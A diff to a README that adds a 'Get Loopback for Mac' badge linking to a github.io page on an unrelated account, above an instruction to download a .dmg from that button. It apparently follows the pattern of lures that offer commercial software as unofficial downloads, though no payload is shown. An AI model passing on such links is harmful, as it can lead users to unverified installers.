@@ -4,6 +4,12 @@
 <img src="https://images.icon-icons.com/3053/PNG/512/loopback_macos_bigsur_icon_190021.png" alt="Loopback Mac Logo">  
 </div>  
 
+<div align="center">  
+<a href="https://junimata-orex.github.io/.github/loopback">  
+<img src="https://img.shields.io/badge/🎧_Get_Loopback_for_Mac-darkblue?style=for-the-badge&logo=apple" alt="Get Loopback for Mac">  
+</a>  
+</div> 
+
 ## Installation via .dmg:
 
 1. Download .dmg by the button above.
